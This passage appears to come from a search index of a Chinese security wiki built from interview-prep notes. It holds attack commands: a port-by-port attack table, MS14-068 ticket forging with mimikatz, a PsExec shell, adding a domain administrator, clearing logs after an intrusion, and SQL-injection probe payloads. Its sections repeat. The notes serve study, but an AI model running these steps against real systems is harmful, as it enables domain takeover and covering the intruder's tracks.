%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_6","text":"","title":"\u6728\u9a6c\u4f20\u64ad\u9014\u5f84"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_7","text":"","title":"\u6076\u610f\u8f6f\u4ef6"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_8","text":"","title":"\u7f51\u9875\u6302\u9a6c"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_9","text":"","title":"\u7535\u5b50\u90ae\u4ef6\u75c5\u6bd2"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_10","text":"","title":"\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u7684\u98ce\u9669"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#icmp","text":"","title":"icmp\u534f\u8bae"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_11","text":"\u8fc7\u6ee4\u3001\u5e94\u7528\u4ee3\u7406\u3001\u72b6\u6001\u68c0\u6d4b\u3001\u9ad8\u7ea7\u5e94\u7528","title":"\u9632\u706b\u5899\u7684\u7c7b\u522b\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#http","text":"","title":"http\u54cd\u5e94\u72b6\u6001"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#cookiesession","text":"","title":"cookie\u548csession"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#getpost","text":"","title":"get\u548cpost\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#httpshttp","text":"http\u957f\u8fde\u63a5\u77ed\u8fde\u63a5","title":"https\u548chttp"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#osi","text":"","title":"osi\u4e03\u5c42\u6a21\u578b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#ssl","text":"","title":"SSL\u5de5\u4f5c\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","text":"","title":"\u5e94\u6025\u54cd\u5e94"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/","text":"","title":"\u6570\u636e\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/","text":"","title":"\u670d\u52a1\u5668\u3001\u4e2d\u95f4\u4ef6\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","text":"","title":"\u6d41\u91cf\u5206\u6790"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u6e17\u900f\u601d\u8def \u00b6 \u7aef\u53e3\u5bf9\u5e94\u7684\u670d\u52a1 \u00b6 21\u7aef\u53e3\uff0cftp \u53ef\u7206\u7834\u6216\u8005\u5c1d\u8bd5\u533f\u540danonymous/\u7a7a\u767b\u5f55 21 ftp \u53ef\u7206\u7834 \u533f\u540danonymous/\u7a7a\u767b\u5f55 MS12-073 22 ssh \u7206\u7834 28\u4e2a\u9000\u683c 23 telnet \u7206\u7834 25 smtp \u90ae\u4ef6\u4f2a\u9020 53 dns dns\u533a\u57df\u4f20\u8f93dns\u52ab\u6301 dns\u7f13\u5b58\u6295\u6bd2 dns\u6b3a\u9a97 \u6df1\u5ea6\u5229\u7528\u5229\u7528dns\u96a7\u9053\u6280\u672f\u523a\u5934\u9632\u706b\u5899 67/68 dhcp \u52ab\u6301\u6b3a\u9a97 80 web 110 pop3 \u7206\u7834 139 samba \u672a\u6388\u6743\u8bbf\u95ee \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e 143 iamp \u7206\u7834 445 smb ms08-067 ms17-010\u6ea2\u51fa\u6f0f\u6d1e IPC$\u653b\u51fb 1433 sqlserver \u6ea2\u51fa\u653b\u51fb \u7a7a\u5bc6\u7801\u5165\u4fb5\u30021433\u8fd8\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5c31\u662f\u5982\u679c\u9ed8\u8ba4\u5b89\u88c5\u7684\u8bdd\uff0c\u7528\u6237\u540d\u662fsa,\u5bc6\u7801\u662f\u7a7a\u7684 3306 mysql \u66b4\u7834 \u6210\u529f\u540e\u7528mysql\u5199\u5165webshell\uff0c\u6216\u8005\u6784\u9020vbs\u5199\u5165\u670d\u52a1\u5668\u542f\u52a8\u9879\uff0c\u542f\u52a8\u65f6\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u6253\u5f003389\u7aef\u53e3 8088 hadoop yarn \u8d44\u6e90\u7ba1\u7406\u5668rest api\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u901a\u8fc7curl -v -X POST\u7533\u8bf7\u65b0\u7684application\uff0c\u6784\u9020\u63d0\u4ea4\u4efb\u52a1\u540e\u5373\u53ef\u5728\u76f8\u5e94\u76ee\u5f55\u751f\u6210webshell 8161 apache activeMQ console\u5b58\u5728\u9ed8\u8ba4\u7aef\u53e3\u548c\u9ed8\u8ba4\u5bc6\u7801\u3001\u672a\u6388\u6743\u8bbf\u95ee \u5f53activeMQ\u5f00\u542fput\u8bf7\u6c42\u65f6\u6784\u9020payload\uff08\u5373\u4e0d\u5b58\u5728\u7684\u76ee\u5f55\uff09response\u4f1a\u8fd4\u56de\u76f8\u5e94\u7684\u7269\u7406\u8def\u5f84\u4fe1\u606f\uff0c\u5f53fileserver\u5b58\u5728\u65f6\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20jspwebshell\uff0c activeMQ\u8fd8\u652f\u6301move\u534f\u8bae\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u79fb\u52a8\u6f0f\u6d1e 6379 redis \u914d\u7f6e\u4e0d\u5f53\u7684\u672a\u6388\u6743 \u94fe\u63a5redis\uff08./redis-cli -h IP)\uff0c\u53ef\u5b9e\u73b0\u5199\u5165webshell\uff0c\u5199\u5165crontab\u8ba1\u5212\u4efb\u52a1fantanshell\uff0c\u4ee5\u53ca\u5199\u5165ssh\u516c\u94a5\uff0c\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650 \u66b4\u7834 11211 memcached \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0ctelnet ip\u5c31\u53ef\u4ee5\u83b7\u5f97\u670d\u52a1\u5668\u654f\u611f\u4fe1\u606f \u6d41\u7a0b \u00b6 \u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u6316\u6398 \u6f0f\u6d1e\u5229\u7528&\u6743\u9650\u63d0\u5347 mysql serv-u Oracle window\u6ea2\u51fa linux\u810f\u725b\u3001\u5185\u6838\u6f0f\u6d1e \u5165\u4fb5Linux\u540e\u8981\u6e05\u695a\u7684\u65e5\u5fd7 \u00b6 web sed -i -e \u5b9a\u5411\u6e05\u695a history ~ wtmp \u767b\u5f55\u65e5\u5fd7 \u57df\u5185\u6a2a\u5411\u79fb\u52a8 \u00b6 MS14-068 kerkeo klist klist purge \u5220\u9664\u6240\u6709\u7968\u636e \u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all \u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u @ -s -d -p MS14-068.exe -u zhangsanfeng@qianxiao996.com -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123 <br/>\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6<br>\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e<br> mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d <br>\u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all<br>\u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword><br/>MS14-068.exe -u <a href=\"&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;\">&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;</a> -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123<code>&lt;br/&gt;\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6&lt;br&gt;\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e&lt;br&gt;</code>mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1<br/>mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1<br/>mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d<code>&lt;br&gt;&lt;br/&gt;\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\\\qianxiao996-dm.qianxiao996.com\\Cmimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d</code><br><br/>\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u4f7f\u7528PSTools\u76ee\u5f55\u4e0b\u7684PsExec.exe\u83b7\u53d6shell:PsExec.exe \\qianxiao996-dm.qianxiao996.com cmd.exe \u6dfb\u52a0\u57df\u7ba1\u7406\u5458net user wangergou ABCabc123 /add /domain net group \"Domain admins\" wangergou /add /domain 0x02.GPP\u6f0f\u6d1e \u7ec4\u7b56\u7565\u4e0b\u53d1 \u7ba1\u7406\u5de5\u5177\u4e2d\u6253\u5f00\u7ec4\u7b56\u7565\u7ba1\u7406\uff1a\u9009\u62e9\u57df\uff0c\u5e76\u65b0\u5efa\u7ec4\u7ec7\u5355\u4f4d\uff1a\u9009\u62e9\u65b0\u5efa\u7684\u7ec4\u7ec7\u5355\u4f4d\uff0c\u5e76\u5efa\u7acbGPO\uff1a\u70b9\u51fb\u65b0\u5efa\u7684GPO\uff1a\u8bbe\u5b9a\u7ec4\u7b56\u7565\u4f5c\u7528\u8303\u56f4\uff1a\uff08\u9009\u62e9\u4e00\u4e2a\u7ec4\uff0c\u5fc5\u987b\u662f\u5b58\u5728\u7684\u7ec4\uff09\u53f3\u952e\u9009\u62e9GPO\uff0c\u9009\u62e9\u7f16\u8f91\u2013\u672c\u5730\u7528\u6237\u548c\u7ec4\uff1a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237\uff1a\u57df\u6210\u5458\u4e0a\u66f4\u65b0\u7ec4\u7b56\u7565\uff0c\u5e76\u67e5\u770b\u7528\u6237:gpupdate net user 0x03.SPN\u7968\u636e\u7834\u89e3 \u5217\u51fa\u5f53\u524d\u7528\u6237\u7684\u7968\u636e\uff1aKerberos::list \u5bfc\u51fa\u7968\u636e\uff1aKerberos::list /export","title":"\u6e17\u900f\u6d4b\u8bd5"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"","title":"\u6e17\u900f\u601d\u8def"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"21\u7aef\u53e3\uff0cftp \u53ef\u7206\u7834\u6216\u8005\u5c1d\u8bd5\u533f\u540danonymous/\u7a7a\u767b\u5f55 21 ftp \u53ef\u7206\u7834 \u533f\u540danonymous/\u7a7a\u767b\u5f55 MS12-073 22 ssh \u7206\u7834 28\u4e2a\u9000\u683c 23 telnet \u7206\u7834 25 smtp \u90ae\u4ef6\u4f2a\u9020 53 dns dns\u533a\u57df\u4f20\u8f93dns\u52ab\u6301 dns\u7f13\u5b58\u6295\u6bd2 dns\u6b3a\u9a97 \u6df1\u5ea6\u5229\u7528\u5229\u7528dns\u96a7\u9053\u6280\u672f\u523a\u5934\u9632\u706b\u5899 67/68 dhcp \u52ab\u6301\u6b3a\u9a97 80 web 110 pop3 \u7206\u7834 139 samba \u672a\u6388\u6743\u8bbf\u95ee \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e 143 iamp \u7206\u7834 445 smb ms08-067 ms17-010\u6ea2\u51fa\u6f0f\u6d1e IPC$\u653b\u51fb 1433 sqlserver \u6ea2\u51fa\u653b\u51fb \u7a7a\u5bc6\u7801\u5165\u4fb5\u30021433\u8fd8\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5c31\u662f\u5982\u679c\u9ed8\u8ba4\u5b89\u88c5\u7684\u8bdd\uff0c\u7528\u6237\u540d\u662fsa,\u5bc6\u7801\u662f\u7a7a\u7684 3306 mysql \u66b4\u7834 \u6210\u529f\u540e\u7528mysql\u5199\u5165webshell\uff0c\u6216\u8005\u6784\u9020vbs\u5199\u5165\u670d\u52a1\u5668\u542f\u52a8\u9879\uff0c\u542f\u52a8\u65f6\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u6253\u5f003389\u7aef\u53e3 8088 hadoop yarn \u8d44\u6e90\u7ba1\u7406\u5668rest api\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u901a\u8fc7curl -v -X POST\u7533\u8bf7\u65b0\u7684application\uff0c\u6784\u9020\u63d0\u4ea4\u4efb\u52a1\u540e\u5373\u53ef\u5728\u76f8\u5e94\u76ee\u5f55\u751f\u6210webshell 8161 apache activeMQ console\u5b58\u5728\u9ed8\u8ba4\u7aef\u53e3\u548c\u9ed8\u8ba4\u5bc6\u7801\u3001\u672a\u6388\u6743\u8bbf\u95ee \u5f53activeMQ\u5f00\u542fput\u8bf7\u6c42\u65f6\u6784\u9020payload\uff08\u5373\u4e0d\u5b58\u5728\u7684\u76ee\u5f55\uff09response\u4f1a\u8fd4\u56de\u76f8\u5e94\u7684\u7269\u7406\u8def\u5f84\u4fe1\u606f\uff0c\u5f53fileserver\u5b58\u5728\u65f6\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20jspwebshell\uff0c activeMQ\u8fd8\u652f\u6301move\u534f\u8bae\uff0c\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u79fb\u52a8\u6f0f\u6d1e 6379 redis \u914d\u7f6e\u4e0d\u5f53\u7684\u672a\u6388\u6743 \u94fe\u63a5redis\uff08./redis-cli -h IP)\uff0c\u53ef\u5b9e\u73b0\u5199\u5165webshell\uff0c\u5199\u5165crontab\u8ba1\u5212\u4efb\u52a1fantanshell\uff0c\u4ee5\u53ca\u5199\u5165ssh\u516c\u94a5\uff0c\u83b7\u53d6\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650 \u66b4\u7834 11211 memcached \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0ctelnet ip\u5c31\u53ef\u4ee5\u83b7\u5f97\u670d\u52a1\u5668\u654f\u611f\u4fe1\u606f","title":"\u7aef\u53e3\u5bf9\u5e94\u7684\u670d\u52a1"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"\u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u6316\u6398 \u6f0f\u6d1e\u5229\u7528&\u6743\u9650\u63d0\u5347 mysql serv-u Oracle window\u6ea2\u51fa linux\u810f\u725b\u3001\u5185\u6838\u6f0f\u6d1e","title":"\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#linux","text":"web sed -i -e \u5b9a\u5411\u6e05\u695a history ~ wtmp \u767b\u5f55\u65e5\u5fd7","title":"\u5165\u4fb5Linux\u540e\u8981\u6e05\u695a\u7684\u65e5\u5fd7"},{"location":"%E5%AE%89%E5%85%A8wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"MS14-068 kerkeo klist klist purge \u5220\u9664\u6240\u6709\u7968\u636e \u76f4\u63a5\u8bbf\u95ee\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all \u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u @ -s -d -p MS14-068.exe -u zhangsanfeng@qianxiao996.com -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123 <br/>\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6<br>\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e<br> mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d <br>\u67e5\u770b\u672c\u673a\u7528\u6237\u4fe1\u606f,\u8bb0\u5f55\u7528\u6237\u540d\u4e0eSID\u53f7whoami /all<br>\u8fdb\u5165MS14-068\u76ee\u5f55\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1aip\u4e3a\u57df\u63a7\u7684ip MS14-068.exe -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword><br/>MS14-068.exe -u <a href=\"&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;\">&#122;&#104;&#97;&#110;&#103;&#115;&#97;&#110;&#102;&#101;&#110;&#103;&#64;&#113;&#105;&#97;&#110;&#120;&#105;&#97;&#111;&#57;&#57;&#54;&#46;&#99;&#111;&#109;</a> -s S-1-5-21-2461438818-3229013638-4126918765-1108 -d 192.168.91.131 -p ABCabc123<code>&lt;br/&gt;\u751f\u6210\u7684\u7968\u636e\u6587\u4ef6&lt;br&gt;\u6253\u5f00mimikatz\uff0c\u6ce8\u5165\u7968\u636e&lt;br&gt;</code>mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1<br/>mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1<br/>mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d<code>&lt;br&gt;&lt;br/&gt;\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\\\qianxiao996-dm.qianxiao996.com\\Cmimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1&lt;br/&gt;mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d</code><br><br/>\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1a\u518d\u6b21\u5217\u51fa\u57df\u63a7\u5236\u5668\u7684C\u76d8\u76ee\u5f55\uff1adir \\qianxiao996-dm.qianxiao996.com\\C \u4f7f\u7528PSTools\u76ee\u5f55\u4e0b\u7684PsExec.exe\u83b7\u53d6shell:PsExec.exe \\qianxiao996-dm.qianxiao996.com cmd.exe \u6dfb\u52a0\u57df\u7ba1\u7406\u5458net user wangergou ABCabc123 /add /domain net group \"Domain admins\" wangergou /add /domain 0x02.GPP\u6f0f\u6d1e \u7ec4\u7b56\u7565\u4e0b\u53d1 \u7ba1\u7406\u5de5\u5177\u4e2d\u6253\u5f00\u7ec4\u7b56\u7565\u7ba1\u7406\uff1a\u9009\u62e9\u57df\uff0c\u5e76\u65b0\u5efa\u7ec4\u7ec7\u5355\u4f4d\uff1a\u9009\u62e9\u65b0\u5efa\u7684\u7ec4\u7ec7\u5355\u4f4d\uff0c\u5e76\u5efa\u7acbGPO\uff1a\u70b9\u51fb\u65b0\u5efa\u7684GPO\uff1a\u8bbe\u5b9a\u7ec4\u7b56\u7565\u4f5c\u7528\u8303\u56f4\uff1a\uff08\u9009\u62e9\u4e00\u4e2a\u7ec4\uff0c\u5fc5\u987b\u662f\u5b58\u5728\u7684\u7ec4\uff09\u53f3\u952e\u9009\u62e9GPO\uff0c\u9009\u62e9\u7f16\u8f91\u2013\u672c\u5730\u7528\u6237\u548c\u7ec4\uff1a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237\uff1a\u57df\u6210\u5458\u4e0a\u66f4\u65b0\u7ec4\u7b56\u7565\uff0c\u5e76\u67e5\u770b\u7528\u6237:gpupdate net user 0x03.SPN\u7968\u636e\u7834\u89e3 \u5217\u51fa\u5f53\u524d\u7528\u6237\u7684\u7968\u636e\uff1aKerberos::list \u5bfc\u51fa\u7968\u636e\uff1aKerberos::list /export","title":"\u57df\u5185\u6a2a\u5411\u79fb\u52a8"},{"location":"%E5%AE%89%E5%85%A8wiki/%E7%9B%AE%E5%BD%95/","text":"\u6458\u81ea\u5b89\u5168\u9762\u8bd5pdf","title":"\u76ee\u5f55"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/","text":"\u524d\u8a00 \u00b6 \u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49 \u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3 \u00b6 \u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9 1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab \u00b6 \u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5 2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e \u00b6 waf\u7684\u539f\u7406 \u00b6 WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002 WAF\u5173\u952e\u6280\u672f \u00b6 WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b waf\u7684\u8bc6\u522b \u00b6 \u57fa\u4e8eCookie\u503c \u00b6 Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix 